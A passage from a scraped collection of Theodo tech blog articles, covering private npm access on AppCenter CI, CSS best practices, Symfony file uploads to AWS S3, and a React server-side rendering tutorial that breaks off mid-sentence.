something.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAntoine Garcia\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tAppCenter is a great CI platform for Mobile Apps. At Theodo we use it as the standard tool for our react-native projects.\nIn a recent project, we needed to have a shared NPM package between the React and React-Native applications. There is no mention of how to achieve this in the AppCenter documentation, and if you ask their support they will say it\u2019s not possible.\nMe: Hello, we\u2019re wanting to have a shared library used in our project. This would require an npm install from a private NPM repo (through package cloud). What is the best practice for adding a private npm access on the AppCenter CI?\nMicrosoft: We currently only support cloud git repositories hosted on VSTS, Bitbucket and GitHub. Support for private repos is not available yet but we are building new features all the time, you can keep an eye out on our roadmap for upcoming features.\nLuckily there is a way!\n\nAppCenter provides the ability to add an `appcenter-post-clone.sh` script to run after the project is cloned. To add one, just add a file named `appcenter-post-clone.sh`, push your branch and, on the configure build screen, see it listed.\n\nPro Tip: You need to press \u201cSave and Build\u201d on the build configuration after pushing a new post-clone script on an existing branch.\nNow, what to put in the script?\nHaving a .npmrc in the directory you run \u2018npm install\u2019 or \u2018yarn install\u2019 from allows you to pass authentication tokens for new registries.\nWe want a .npmrc like this:\n\r\nalways-auth=true\r\nregistry=https://YOUR_PACKAGE/NAME/:_authToken=XXXXXXXX\r\n\nObviously, we don\u2019t really want to commit our read token to our source code, therefore we should use an environment variable.\nSo we can add to our post-clone script:\n\r\ntouch .npmrc\r\necho \"always-auth=true\r\nregistry=https://YOUR_PACKAGE/NAME/:_authToken=${READ_TOKEN}\" > .npmrc\r\n\nNow, on AppCenter, we can go into the build configuration and add an environment variable called \u2018READ_TOKEN\u2019.\n\nNow rebuild your branch and your package installs should pass.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tBen Ellerby\r\n  \t\t\t\r\n  \t\t\t\tI'm an Architect Developer, working with startups to launch MVP's and large corporates to deliver in startup speed. \r\n\r\nI'm tech at heart, loving to code, participating in hackathons, guest lecturing as part of the University of Southampton CompSci course and acting as a tech advisor to multiple startups.\r\n\r\nhttps://www.linkedin.com/in/benjaminellerby/  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tThrough my experiences, I encountered many fellow coworkers that found CSS code painful to write, edit and maintain. For some people, writing CSS is a chore. One of the reasons for that may be that they have never been properly taught how to write good CSS in the first place, nor what is good CSS. Thus it has an impact on their efficiency and on the code quality, which isn\u2019t what we want. This two parts article will focus on:\n\nPart 1: What is good CSS code? (more precisely, what is not good CSS). I will focus on actionable tips and tricks to avoid creating technical debt starting now.\nPart 2: how to migrate from a complex legacy stylesheet to a clean one.\n\nWarning: these are the guidelines that I gathered through my experiences and that worked well for many projects I worked on. In the end, adopt the methods that fit your needs.\nRequirements\nI assume that you are looking for advice to improve yourself at writing CSS, thus you have a basic knowledge of CSS and how it works. In addition, you will need these things:\nA definition of done\nYou should be very clear about which browser/devices you want to support or not. You must list browsers/devices you want to support and stick to it. Here is an example of what can be a definition of done:\n\nBrowsers: Chrome \u2265 63, Firefox \u2265 57, Edge \u2265 12\nDevices: laptops with resolution \u2265 1366*768\n\nYou must write this list with a business vision: maybe your business needs IE support because 20% of your users are using it. You can be specific for some features. For instance: the landing page should work on devices with small screens but the app behind the login should not.\nBut if your Definition Of Done does not include IE9, do not spend unnecessary time fixing exotic IE9 bugs. From there you can use caniuse.com to see which CSS features are supported on your target browsers (example below).\n\nA good understanding of what specificity is\nHere is a quick reminder about what is specificity:\nSpecificity determines which CSS rule is applied by the browsers. If two selectors apply to the same element, the one with higher specificity wins.\nThe rules to win the specificity wars are:\n\nInline style beats ID selectors. ID selectors are more specific than classes and attributes (::hover,\u00a0::before\u2026). Classes win over element selectors.\nA more specific selector beats any number of less specific selectors. For instance,\u00a0.list\u00a0is more specific than\u00a0div ul li.\nIncreasing the number of selectors will result in higher specificity. .list.link\u00a0is more specific than\u00a0.list and .link.\nIf two selectors have the same specificity, the last rule read by the browser wins.\nAlthough !important\u00a0has nothing to do with the specificity of a selector, it is good to know that a declaration using !important overrides any normal declaration. When two conflicting declarations have the !important keyword, the declaration with a greater specificity wins.\n\nHere is a good website to compute the specificity of a selector:\u00a0Specificity Calculator. Below is a chart to recap all these rules (taken from this funny post on specificity).\n\nSome basic knowledge of preprocessors\nPreprocessors are great because they allow you to write CSS faster. They also help to make the code more understandable and customizable by using variables. Here I will use a SCSS syntax in the examples (my favorite preprocessor but others like LESS/Stylus are pretty similar). An example of what you can do with preprocessors:\n// vars.scss\r\n$messageColor: #333;\r\n\r\n// message.scss\r\n@import 'vars';\r\n%message-shared {\r\n    border: 1px solid black;\r\n    padding: 10px;\r\n    color: $messageColor;\r\n}\r\n\r\n.message {\r\n    @extend %message-shared;\r\n}\r\n.success {\r\n    @extend %message-shared;\r\n    border-color: green;\r\n}\r\n\nVariables in CSS can now be done with native CSS but preprocessors still have the upper hand on readability/usability.\nWhat you should not do\nI will show you what you DON\u2019T want to do and explain why such coding practices will lead to many problems over time.\nDon\u2019t write undocumented CSS\nI put this point first because I believe it\u2019s one of the most impactful things you can act on straightaway. Like any other language, CSS needs to be commented. Most stylesheets don\u2019t have comments. And when I advise you to write comments, I don\u2019t talk about this:\n// Header style\r\n.header {}\r\n\nThose are bad comments because they have no purpose and convey no additional information. A good CSS comment explains the intention behind a selector/rule. Here is an example of some good comments:\n.suggestions {\r\n    // 1 should be enough but in fact there is a Bootstrap rule that says\r\n    // .btn-group>.btn:hover z-index: 2 (don't ask me why they did this)\r\n    z-index: 3;\r\n}\r\n\r\n// Firefox doesn't respect some CSS3 specs on the box model rules\r\n// regarding height. This is the only cross-brower way to do an \r\n// overflowing-y child in a fixed height container.\r\n// See https://blogs.msdn.microsoft.com/kurlak/2015/02/20/filling-the-remaining-height-of-a-container-while-handling-overflow-in-css-ie8-firefox-chrome-safari/\r\n.fixed-height-container {}\r\n\nWhat should you comment on?\n\nCSS hacks\nEvery line you didn\u2019t write or you wrote 6 months ago (which is the same) where you needed more than 10 seconds to understand its intended purpose.\nMagic values. Speaking of which\u2026\n\nDon\u2019t use magic values\nThe most common thing between developers resenting CSS is a general feeling of black magic. Put a rule here and an !important there, with a width value that looks good and it works. You see? Magic. But magic doesn\u2019t exist. You should have a more scientific approach to demystify CSS. Writing good comments is one thing. Stopping writing magic values is another.\nI define a magic value by \u201cany value that looks weird, aka is not a multiple of 5\u201d \u2013 even then some values may look weird. Examples of magic values are:\nleft: 157px;\r\nheight: 328px;\r\nz-index: 1501;\r\nfont-size: 0.785895rem;\r\n\nWhy are these values problematic? Because again, they do not convey the intention. What is better:\n\nUsing preprocessor variables which adds a meaning to a number.\nMake the exact calculation. If you wrote this value after some tests using the Chrome dev tools you may find out with a scientific approach that your initial \u201cmagic\u201d value may not be the most accurate one.\nCommenting the value to explain why it\u2019s here.\nChallenging your value/unit and changing it to a more pertinent one.\n\nExample:\nleft: calc(50% - ($width / 2));\r\n// An item have a 41px height:\r\n// 2*10px from padding+20px from line-height+1px from one border.\r\n// So to get 8 items in height:\r\nheight: 8 * 41px;\r\nz-index: 1501; // Needs to be above .navbar\r\nfont-size: 0.75rem;\r\n\nDon\u2019t use px units everywhere\nMost hellish CSS stylesheets use px units everywhere. In fact, you should almost never use them. In most cases, pixels never is the good unit to use. Why? Because they don\u2019t scale with the font-size or the device resolution. Here is a recap of which unit to use depending on the context. Quick cheat sheet:\n\npx: do not scale. Use for borders and the base font size on the html element. That\u2019s all.\nem, rem (> IE8): scale with the font-size. 1.5em is 150% of the font size of the current element. 0.75rem is 75% of the font size of the html element. Use rem for typography and everything vertical like margins and paddings. Use em wisely for elements relative to the font-size (icons as a font for instance) and use it for media query breakpoints.\n%, vh, vw (> IE8): scale with the resolution. vh and vw are percentages of the viewport height and width. These units are perfect for layouts or in a calc to compute the remaining space available (min-height: calc(100vh - #{$appBarHeight})).\n\nI made a page for you to play with the base font-size and CSS units (open in a new window to resize the viewport and try changing the zoom setting).\nDon\u2019t use !important\nYou should keep your specificity as low as possible. Otherwise, you will be overriding your override rules. If you tend to override your styles, with time passing you will hit the hard ceiling \u2013 !important and inline style. Then it will be a nightmare to create more specific CSS rules.\nUsing !important is a sign that you\u2019re working against yourself. Instead, you should understand why you have to do this. Maybe refactoring the impacted class will help you, or decoupling the common CSS in another class would allow you not to use it and lower your specificity.\nThe only times you should use it is when there is absolutely no other way to be more specific than an external library you are using.\nDon\u2019t use IDs as selectors\nKeep. Your. Specificity. Low. Using an ID instead of a class condemn you to not reuse the code you\u2019re writing right now. Furthermore, if your javascript code is using IDs as hooks it could lead to dead code (you are not certain whether you can remove this ID because it could be used by the JS and/or CSS).\nInstead of using IDs, try to look up common visual patterns you could factorize for future reuse. If you need to be specific, add a class on the lowest level of the DOM tree possible. At the very least, use a class with the name you would have given to your ID.\n// Don't\r\n#app-navbar {}\r\n\r\n// Slighlty better\r\n.app-navbar {}\r\n\r\n// Better (pattern that you could reuse)\r\n.horizontal-nav {}\r\n\nDon\u2019t use HTML elements as selectors\nAgain. Keep your specificity low. Using HTML tags as selectors goes against this because you will have to add higher-specificity selectors to overwrite them later on. For instance, styling the a element (especially the a element, with all its use cases and different states) will be an inconvenience when you use it in other contexts.\n// Don't\r\n<a>Link</a>\r\n<a class=\"button\">Call to action</a>\r\n<nav class=\"navbar\"><a>Navbar link</a></nav>\r\na { ... }\r\n.button { ... }\r\n// Because you will have to create more specific selectors\r\na.button { ...overrides that have nothing to do with the button style... }\r\n.navbar a { ...same... }\r\n\r\n// Better\r\n<a class=\"link\">Link</a>\r\n<a class=\"button\">Call to action</a>\r\n<nav class=\"navbar\"><a class=\"navbar-link\">Navbar link</a></nav>\r\n.link { ...style of a link, can be used anywhere... }\r\n.button { ...style of a button, idem... }\r\n.navbar-link { ...style of a navbar link, used only in navbars... }\r\n\nHowever, there are some cases when you could use them, for instance when a user wrote something like a blog post that is output in pure HTML format (therefore preventing you from adding custom classes).\n// Don't\r\nul { ... }\r\n\r\n// Better\r\n%textList { ... }\r\n.list { @extends %textList; }\r\n.user-article {\r\n    ul { @extends %textList; }\r\n}\r\n\nFurthermore, HTML should be semantic and the only hooks for style should be the classes. Don\u2019t be tempted to use an HTML tag because it has some style attached to it.\nA side-note on the ideal specificity\nYou should aim for a specificity of only one class for your CSS selectors.\nThe best part in Cascading Style Sheets is \u201ccascading\u201d. The worst part in Cascading Style Sheets is \u201ccascading\u201d \u2014 The Internet\nThe whole thing about CSS is that you want to make your style the same everywhere (therefore it needs to be reusable) AND you want to make it different in some unique places (therefore it needs to be specific). All CSS structure issues are variations of this basic contradiction.\nOpinion: The Cascading effect of CSS can be a great tool and it serves a purpose: to determine which CSS declaration is applied when there is a conflict. But it is not the best tool to solve this problem. What if instead, there were no conflicts on CSS declarations, ever? We wouldn\u2019t need the Cascade effect and everything would be reusable. Even \u201csuper-specific\u201d code can be written as a class that will be used only once. If you use selectors of only one class, you will never need to worry about specificity and overwriting styles between components.\n\u201cBut that could lead to a lot of duplicated source code\u201d, you could say. And you would be right if there were no CSS preprocessors. With preprocessors, defining mixins to reuse bits of CSS by composition is a great way to factor your code without using more specific selectors.\nThere is still a concern over performance because the output stylesheet is bigger. But for most stylesheets/projects, CSS performance is irrelevant over javascript concerns. Furthermore, the advantage of maintainability far outweighs the performance gains.\nIf we try to combine the last three Don\u2019ts, this is how I would take this code:\n<main id=\"main_page\">\r\n    <p><a>Some link</a></p>\r\n    <footer>\r\n        <a>Some other link</a>\r\n    </footer>\r\n</main>\r\n\r\na {\r\n    cursor: pointer;\r\n}\r\n\r\n#main_page {\r\n    a {\r\n        color: blue;\r\n\r\n        &:hover {\r\n            color: black;\r\n        }\r\n    }\r\n}\r\n\r\nfooter {\r\n    border: 1px solid black;\r\n\r\n    a {\r\n        color: grey !important;\r\n    }\r\n}\r\n\nAnd turn it into this:\n<main>\r\n    <p><a class=\"link\">Some link</a></p>\r\n    <footer class=\"footer\">\r\n        <a class=\"footer-link\">Some other link</a>\r\n    </footer>\r\n</main>\r\n\r\n.link {\r\n    cursor: pointer;\r\n    color: blue;\r\n\r\n    &:hover {\r\n        color: black;\r\n    }\r\n}\r\n\r\n.footer {\r\n    border: 1px solid black;\r\n\r\n    &-link {\r\n        // You can use a mixin here if there is a need to factor in\r\n        // the common code with .link\r\n        cursor: pointer;\r\n        color: grey;\r\n    }\r\n}\r\n\nWhat you can do right now\nDo try to understand how CSS declarations really work\nThere are some declarations you really want to understand. Because if you don\u2019t there will still be a feeling of \u201cblack magic\u201d happening.\n\nvertical-align: middle; margin: 0 auto; all the things!\nWhat you should know (tip: if you think you would not be able to explain it clearly to someone else, click the links):\n\nThe box model (width, height, padding, margin, border, box-sizing, display: block/inline/inline-block).\nPositioning and positioning contexts (position: static/relative/absolute/fixed, z-index).\nTypography (font-size, font-weight, line-height, text-transform, text-align, word-break, text-overflow, vertical-align)\nSelectors (*, >, +, ::before, ::after, :hover, :focus, :active, :first-child, :last-child, :not(), :nth-child())\n\nBonus ones to go further:\n\nA complete guide to tables\nTransitions\nShadows & filters\nFloats (only if you have to. My advice would be: don\u2019t use floats).\n\nDo look at Flexbox and Grid\nIf your Definition of Done doesn\u2019t include older browsers and you don\u2019t use/know the flexbox and/or grid model, it will solve a lot of your layout problems. You may want to check these great tutorials:\n\nA complete guide to Flexbox (Chrome \u2265 21, Firefox \u2265 28, IE \u2265 10, Safari \u2265 6.1)\nA complete guide to Grid (Chrome \u2265 57, Firefox \u2265 52, IE \u2265 10, Safari \u2265 10.3), a short example of grid use\n\nAn example of a possible layout implementation possible with Grid and that is not a nightmare to implement:\n\nDo look at BEM and CSS modules/styled components and apply it to new components\nYou should use CSS guidelines such as BEM. It will make your code more maintainable/reusable and prevent you from going down into the specificity hell. Here is a great article on BEM which I recommend.\nFurthermore, if you have a component-based architecture (such as React, Vue or Angular), I recommend CSS modules or styled components to remove the naming hassle of BEM (here is an article on the whole topic).\nOpinion: there is one main gotcha with these tools. You may believe that the auto-scoping feature of these tools acts as a pseudo-magic protection. However, beware that you should not bypass the above Don\u2019ts. For instance, using HTML elements in CSS modules selectors destroys the purpose of auto-scoping because it will cascade to all children components. You should also keep a strict BEM-like approach (structuring your component styles into blocks, elements, and modifiers) while using these kinds of tools.\nDo challenge and remove useless CSS\nA lot can be done by using only seven CSS properties. Do challenge CSS that does not seems essential. Is this linear-gradient background color essential when nobody sees the gradient effect? Are those box-shadow declarations really useful?\nYou can also find unused CSS with Chrome\u2019s CSS coverage. In the \u201cMore tools\u201d drop-down, activate the \u201cCoverage\u201d tool, start recording and crawl your target pages. Here is an example showing that the .TextStat class is never used, as well as 70% of the whole stylesheet.\n\nDo it yourself\nA note on frameworks like Bootstrap and others: they are useful for small and quick projects when you don\u2019t have time to dedicate to style. But for many medium-sized and a lot of large-sized projects, don\u2019t use them.\nOver time, you will need to overwrite them and it will eventually take more time than doing it yourself because it will produce a more complex and more specific code.\nIn addition, doing your style yourself makes you learn a lot. UI designer is a whole job so creating a UI from scratch is a real challenge. At first, try to reproduce the same look and feel than other websites you like (you can look at the code with the browser dev tools). My personal experience is that I started to love and learn CSS the moment I threw Bootstrap out the window for a personal project and started writing my own style.\n\nI hope that with all the above best practices you will feel more comfortable writing CSS and that it will help you enhance your code quality. In Part 2 I will address the hassle of migrating a hellish complex stylesheet full of black magic to a clean, understandable and maintainable one. So don\u2019t hesitate to share your CSS horror stories!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAlb\u00e9ric Trancart\r\n  \t\t\t\r\n  \t\t\t\tAlb\u00e9ric Trancart is an agile web developer at Theodo. He loves sharing what he has learnt and exchanging with great people.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWhy?\nAdding upload fields in Symfony application eases the way of managing assets. It makes it possible to upload public assets as well as sensitive documents instantly without any devops knowledge. Hence, I\u2019ll show you a way of implementing a Symfony / Amazon AWS architecture to store your documents in the cloud.\nSetup Symfony and AWS\nFirst you need to setup both Symfony and AWS to start storing some files from Symfony in AWS buckets.\nAmazon AWS\nCreating a bucket on Amazon AWS is really straight forward. First you need to sign up on Amazon S3 (http://aws.amazon.com/s3). Go to the AWS console and search S3. Then click on Create a bucket.\nFollow bucket creation process choosing default values (unless you purposely want to give public access to your documents, you should keep your bucket private). Eventually create a directory for each of your environments. Your AWS S3 bucket is now ready to store your documents.\nSymfony\nNow you need to setup Symfony to be able to store files and to communicate with Amazon AWS. You will need 2 bundles and 1 SDK to set it up:\n\nVichUploader (a bundle that will ease files upload)\nKNP/Gauffrette (a bundle that will provide an abstraction layer to use uploaded files in your Symfony application without requiring to know where those files are actually stored)\nAWS-SDK (A SDK provided by Amazon to communicate with AWS API)\n\nInstall the two bundles and the SDK with composer:\n\r\ncomposer require vich/uploader-bundle\r\ncomposer require aws/aws-sdk-php\r\ncomposer require knplabs/knp-gaufrette-bundle\r\n\r\n\nThen register the bundles in AppKernel.php\n\r\npublic function registerBundles()\r\n    {\r\n     return [\r\n            \tnew Vich\\UploaderBundle\\VichUploaderBundle(),\r\n            \tnew Knp\\Bundle\\GaufretteBundle\\KnpGaufretteBundle(),\r\n            ];\r\n    }\r\n\r\n\nBucket parameters\nIt is highly recommended to use environment variables to store your buckets parameters and credentials. It will make it possible to use different buckets depending on your environment and will prevent credentials from being stored in version control system. Hence, you won\u2019t pollute your production buckets with test files generated in development environment.\nYou will need to define four parameters to get access to your AWS bucket:\n\nAWS_BUCKET_NAME\nAWS_BASE_URL\nAWS_KEY (only for and private buckets)\nAWS_SECRET_KEY (only for and private buckets)\n\nYou can find the values of these parameters in your AWS console.\nConfiguration\nYou will have to define a service extending Amazon AWS client and using your AWS credentials.\nAdd this service in services.yml:\n\r\nct_file_store.s3:\r\n        class: Aws\\S3\\S3Client\r\n        factory: [Aws\\S3\\S3Client, 'factory']\r\n        arguments:\r\n            -\r\n                version: YOUR_AWS_S3_VERSION (to be found in AWS console depending on your bucket region and version)\r\n                region: YOUR_AWS_S3_REGION\r\n                credentials:\r\n                    key: '%env(AWS_KEY)%'\r\n                    secret: '%env(AWS_SECRET)%'\r\n\r\n\nNow you need to configure VichUploader and KNP_Gaufrette in Symfony/app/config/config.yml. Use the parameters previously stored in your environment variables.\nHere is a basic example:\n\r\nknp_gaufrette:\r\n    stream_wrapper: ~\r\n    adapters:\r\n        document_adapter:\r\n            aws_s3:\r\n                service_id: ct_file_store.s3\r\n                bucket_name: '%env(AWS_BUCKET)%'\r\n                detect_content_type: true\r\n                options:\r\n                    create: true\r\n                    directory: document\r\n    filesystems:\r\n        document_fs:\r\n            adapter:    document_adapter\r\n\r\nvich_uploader:\r\n    db_driver: orm\r\n    storage: gaufrette\r\n    mappings:\r\n        document:\r\n            inject_on_load: true\r\n            uri_prefix: \"%env(AWS_BASE_URL)%/%env(AWS_BUCKET)%/document\"\r\n            upload_destination: document_fs\r\n            delete_on_update:   false\r\n            delete_on_remove:   false \r\n\r\n\nUpload files\nFirst step in our workflow is to upload a file from Symfony to AWS. You should create an entity to store your uploaded document (getters and setters are omitted for clarity, you will need to generate them).\nThe attribute mapping in $documentFile property annotation corresponds to the mapping defined in config.yml. Don\u2019t forget the class attribute @Vich\\Uploadable().\n\r\nnamespace MyBundle\\Entity;\r\n\r\nuse Doctrine\\ORM\\Mapping as ORM;\r\nuse Symfony\\Component\\HttpFoundation\\File\\File;\r\nuse Vich\\UploaderBundle\\Mapping\\Annotation as Vich;\r\n\r\n/**\r\n * Class Document\r\n *\r\n * @ORM\\Table(name=\"document\")\r\n * @ORM\\Entity()\r\n * @Vich\\Uploadable()\r\n */\r\nclass Document\r\n{\r\n    /**\r\n     * @var int\r\n     *\r\n     * @ORM\\Column(type=\"integer\", name=\"id\")\r\n     * @ORM\\Id\r\n     * @ORM\\GeneratedValue(strategy=\"AUTO\")\r\n     */\r\n    private $id;\r\n\r\n    /**\r\n     * @var string\r\n     *\r\n     * @ORM\\Column(type=\"string\", length=255, nullable=true)\r\n     */\r\n    private $documentFileName;\r\n\r\n    /**\r\n     * @var File\r\n     * @Vich\\UploadableField(mapping=\"document\", fileNameProperty=\"documentFileName\")\r\n     */\r\n    private $documentFile;\r\n\r\n    /**\r\n     * @var \\DateTime\r\n     *\r\n     * @ORM\\Column(type=\"datetime\")\r\n     */\r\n    private $updatedAt;\r\n}\r\n\r\n\nThen you can add an uploaded document to any of your entities:\n\r\n     /**\r\n     * @var Document\r\n     *\r\n     * @ORM\\OneToOne(\r\n     *     targetEntity=\"\\MyBundle\\Entity\\Document\",\r\n     *     orphanRemoval=true,\r\n     *     cascade={\"persist\", \"remove\"},\r\n     * )\r\n     * @ORM\\JoinColumn(name=\"document_file_id\", referencedColumnName=\"id\", onDelete=\"SET NULL\")\r\n     */\r\n    private $myDocument;\r\n\r\n\nCreate a form type to be able to upload a document:\n\r\nclass UploadDocumentType extends AbstractType\r\n{\r\n    public function buildForm(FormBuilderInterface $builder, array $options)\r\n    {\r\n        add('myDocument', VichFileType::class, [\r\n                'label'         => false,\r\n                'required'      => false,\r\n                'allow_delete'  => false,\r\n                'download_link' => true,\r\n            ]);\r\n    }\r\n...\r\n}\r\n\r\n\nUse this form type in your controller and pass the form to the twig:\n\r\n...\r\n$myEntity = new MyEntity();\r\n$form = $this->createForm(UploadDocumentType::class, $myEntity);\r\n...\r\nreturn [ 'form' => $form->createView()];\r\n\r\n\nFinally, add this form field in your twig and you should see an upload field in your form:\n\r\n<div class=\"row\">\r\n    <div class=\"col-xs-4\">\r\n        {{ form_label(form.myDocument) }}\r\n    </div>\r\n    <div class=\"col-xs-8\">\r\n        {{ form_widget(form.myDocument) }}\r\n    </div>\r\n    <div class=\"col-xs-8 col-xs-offset-4\">\r\n        {{ form_errors(form.myDocument) }}\r\n    </div>\r\n</div>\r\n\r\n\nNavigate to your page, upload a file and submit your form. You should now be able to see this document in your AWS bucket.\nUsers are now able to upload files on your Symfony application and these documents are safely stored on Amazon AWS S3 bucket. The next step is to provide a way to download and display these documents from AWS in your Symfony application.\nDisplay or download documents stored in private buckets\nIn most cases, your files are stored in private buckets. Here is a step by step way to safely give access to these documents to your users.\nGet your document from private bucket\nYou will need a method to retrieve your files from your private bucket and display it on a custom route. As a result, users will never see the actual route used to download the file. You should define this method in a separate service and use it in the controller.\ns3PrivateClient is the service we defined previously extending AWS S3 client. You will need to inject your bucket name from your environment variables in this service. my-documents/ is the folder you created to store your documents.\n\r\n     /**\r\n     * @param string $documentName\r\n     *\r\n     * @return \\Aws\\Result|bool\r\n     */\r\n    public function getDocumentFromPrivateBucket($documentName)\r\n    {\r\n        try {\r\n            return $this->s3PrivateClient->getObject(\r\n                [\r\n                    'Bucket' => $this->privateBucketName,\r\n                    'Key'    => 'my-documents/'.$documentName,\r\n                ]\r\n            );\r\n        } catch (S3Exception $e) {\r\n            // Handle your exception here\r\n        }\r\n    }\r\n\r\n\nDefine an action with a custom route:\nYou will need to use the method previously defined to download the file from AWS and expose it on a custom route.\n\r\n     /**\r\n     * @param Document $document\r\n     * @Route(\"/{id}/download-document\", name=\"download_document\")\r\n     * @return RedirectResponse|Response\r\n     */\r\n    public function downloadDocumentAction(Document $document)\r\n    {\r\n        $awsS3Uploader  = $this->get('app.service.s3_uploader');\r\n\r\n        $result = $awsS3Uploader->getDocumentOnPrivateBucket($document->getDocumentFileName());\r\n\r\n        if ($result) {\r\n            // Display the object in the browser\r\n            header(\"Content-Type: {$result['ContentType']}\");\r\n            echo $result['Body'];\r\n\r\n            return new Response();\r\n        }\r\n\r\n        return new Response('', 404);\r\n    }\r\n\r\n\nDownload document\nEventually add a download button to access a document stored in a private bucket directly in your Symfony application.\n\r\n<a href=\"{{ path('/download-document', {'id': document.id}) }}\" \r\n                   target=\"_blank\">\r\n   <i class=\"fa fa-print\">\r\n   {{ 'label_document_download'|trans }}\r\n</a>\r\n\r\n\nPublic assets\nYou may want to display some assets from Amazon AWS in public pages of your application. To do so, use a public bucket to upload these assets. It is quite straight forward to access it to display them. Be conscious that anyone will be able to access these files outside your application.\n\r\n<img src=\"{{ vich_uploader_asset(myEntity.myDocument, 'documentFile') }}\" alt=\"\" />\r\n\r\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAlan Rauzier\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tUsually, we are completely running React.js on client-side: Javascript is interpreted by your browser. The initial html returned by the server contains a placeholder, e.g.\u00a0<div id=\"root\"></div>, and then, once all your scripts are loaded, the entire UI is rendered in the browser. We call it client-side rendering.\nThe problem is that, in the meantime, your visitor sees\u2026 nothing, a blank page!\nLooking for how to get rid of this crappy blank page for a personal project, I discovered Next.js: in my opinion the current best framework for making server-side rendering and production ready React applications.\nWhy SSR (Server-Side Rendering)?\nThis is not the point of this article, but here is a quick sum-up of what server-side rendering can bring to your application:\n\nImprove your SEO\nSpeed up your first page load\nAvoid blank page flicker before rendering\n\nIf you want to know more about it, please read this great article: Benefits of Server-Side Over Client Side Rendering.\nBut let\u2019s focus on the \u201chow\u201d rather than the \u201cwhy\u201d here.\nWhat\u2019s the plan?\nFor this article, I start with a basic app made\u00a0with\u00a0create-react-app. Your own React application is probably using similar settings.\nThis article is split in 3 sections matching 3 server-side-rendering strategies:\n\nHow tomanually upgrade your React app to get\u00a0SSR\nHow to start with Next.js from scratch\nMigrate your existing React app to server-side with Next.js\n\nI won\u2019t go through all the steps, but I will bring your attention on the main points of interesting. I also provide a repository for each of the 3 strategies. As the article is a bit long, I\u2019ve split it in 2 articles, this one will only deal with the first 2 sections. If your main concern is to migrate your app to Next.js, you can go directly to the second article\u00a0(coming soon).\n1) Look how twisted manual SSR is\u2026\n\nIn this part, we will see how to implement Server-side Rendering\u00a0manually on an existing React app. Let\u2019s take the\u00a0create-react-app\u00a0starter code:\n\npackage.json\u00a0for dependencies\nWebpack configuration included\nApp.js\u00a0\u2013 loads React and renders the Hello component\nindex.js\u00a0\u2013 puts all together into a root component\n\nChecking rendering type\nI just added to the code base a simple function\u00a0isClientOrServer\u00a0based on the availability of\u00a0the Javascript object window representing the browser\u2019s window:\nconst isClientOrServer = () => {\r\n  return (typeof window !== 'undefined' && window.document) ? 'client' : 'server';\r\n};\r\n\nso that we display on the page what is rendering the application: server or client.\nTest it by yourself\n\nclone\u00a0this repository\ncheckout the initial commit\ninstall the dependencies with\u00a0yarn\nlaunch the dev server with\u00a0yarn start\nbrowse to\u00a0http://localhost:3000\u00a0to view the app\n\nI am now simulating a \u20183G network\u2019 in Chrome so that we really understand what is going on:\n\nImplementing\u00a0Server-side Rendering\nLet\u2019s fix that crappy flickering with server-side rendering! I won\u2019t show all the code (check the repo to see it in details) but here are the main steps.\nWe first need a node server using Express:\u00a0yarn add express.\nIn our React app, Webpack only loads the src/ folder, we can thus create a new folder named server/ next to it. Inside, create a file\u00a0index.js\u00a0where we use express and a server renderer.\n// use port 3001 because 3000 is used to serve our React app build\r\nconst PORT = 3001; const path = require('path');\r\n\r\n// initialize the application and create the routes\r\nconst app = express();\r\nconst router = express.Router();\r\n\r\n// root (/) should always serve our server rendered page\r\nrouter.use('^/$', serverRenderer);\r\n\nTo render our html, we use a server renderer that is replacing the root component with the built html:\n// index.html file created by create-react-app build tool\r\nconst filePath = path.resolve(__dirname, '..', '..', 'build', 'index.html');\r\n\r\nfs.readFile(filePath, 'utf8', (err, htmlData) => {\r\n  // render the app as a string\r\n  const html = ReactDOMServer.renderToString(<App />);\r\n\r\n  // inject the rendered app into our html\r\n  return res.send(\r\n    htmlData.replace(\r\n      '<div id=\"root\"></div>',\r\n      `<div id=\"root\">${html}</div>`\r\n    )\r\n  );\r\n}\r\n\nThis is possible thanks to\u00a0ReactDOMServer.renderToString\u00a0which fully renders the HTML markup of a page to a string.\nWe finally need an entry point that will tell Node how to interpret our React JSX code. We achieve this with Babel.\nrequire('babel-register')({\r\n  ignore: [ /(node_modules)/ ],\r\n  presets: ['es2015', 'react-app']\r\n});\r\n\nTest it by yourself\n\ncheckout last 